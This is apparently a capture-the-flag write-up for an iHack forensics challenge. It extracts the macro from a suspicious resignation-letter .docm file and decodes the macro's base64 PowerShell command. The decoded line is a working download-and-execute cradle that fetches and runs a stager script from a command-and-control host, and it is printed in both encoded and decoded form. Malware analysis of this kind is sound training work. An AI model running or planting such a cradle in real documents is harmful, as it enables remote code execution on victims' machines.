# DOCM

> **Challenge Description:** Something is suspicious with this resign letter document. Can you investigate what is the 'suspicious' thing. Identify the full malicious URL.
>
> **Flag Format:** `ihack{URL}`

### Solution

Unpack the maldoc by unzipping the file. The content of macro extracted is saved in a separate file `vbaProject.bin`.

```
â”Œâ”€â”€(kaliðŸ’€JesusCries)-[~/Desktop/iHack/DOCM]
â””â”€$ unzip letter.docm                            
Archive:  letter.docm
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: word/document.xml       
  inflating: word/_rels/document.xml.rels  
  inflating: word/vbaProject.bin     
  inflating: word/theme/theme1.xml   
  inflating: word/_rels/vbaProject.bin.rels  
  inflating: word/vbaData.xml        
  inflating: word/settings.xml       
  inflating: word/styles.xml         
  inflating: word/webSettings.xml    
  inflating: word/fontTable.xml      
  inflating: docProps/core.xml       
  inflating: docProps/app.xml    
```

Carving for strings on the `vbaProject.bin` file will reveal a base-64 encoded PowerShell command.

```
â”Œâ”€â”€(kaliðŸ’€JesusCries)-[~/Desktop/iHack/DOCM/word]
â””â”€$ strings vbaProject.bin | grep "powershell"
powershell.exe -enc cABvAHcAZQByAHMAaABlAGwAbAAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAbgBjAC4AaQBoAGEAYwBrAC4AYwBvAG0ALwBzAHQAYQBnAGUAcgAuAHAAcwAxACcAKQA='
```

Decode the base64 payload to reveal the flag.

```
â”Œâ”€â”€(kaliðŸ’€JesusCries)-[~/Desktop/iHack/DOCM/word]
â””â”€$ echo "cABvAHcAZQByAHMAaABlAGwAbAAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGMAbgBjAC4AaQBoAGEAYwBrAC4AYwBvAG0ALwBzAHQAYQBnAGUAcgAuAHAAcwAxACcAKQA=" | base64 -d
powershell IEX (New-Object Net.WebClient).DownloadString('http://cnc.ihack.com/stager.ps1')
```

**Flag:** `ihack{http://cnc.ihack.com/stager.ps1}`
